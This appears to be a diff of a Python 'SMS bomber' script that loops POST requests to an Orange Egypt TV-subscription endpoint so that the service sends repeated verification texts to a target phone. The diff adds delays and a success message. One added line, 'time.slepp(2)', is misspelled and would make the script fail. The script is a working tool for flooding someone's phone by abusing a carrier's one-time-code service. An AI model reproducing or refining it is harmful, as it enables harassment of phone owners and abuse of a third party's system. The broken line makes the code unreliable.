@@ -79,7 +79,7 @@ number_of_messeges=(int(input ('Enter Number Of Messages  :  ')))
 
 zcx=0
 while zcx<number_of_messeges:
-    
+    time.slepp(2)
     url=('http://tvsub.orange.eg/VideoPortalLandingPage/SubInt')
     headers={
 'Host': 'tvsub.orange.eg',
@@ -118,12 +118,13 @@ while zcx<number_of_messeges:
 
 'os':'null'
 }
+    time.sleep (1)
     r=requests.post (url,headers=headers, data=data).text
     print ()
     zcx=zcx+1
     if 'سيصلك كود قصير على الموبايل الآن عن طريق ال SMS قم بإدخاله هنا'in r:
         time.sleep (1)
-        print (f'\033[;096mDone Send {zcx} SMS')
+        print (f'\033[;096mDone Sent {zcx} SMS')
         time.sleep (1)
     else:
         print ('\033[;091mSomthing Wrong Try Again')
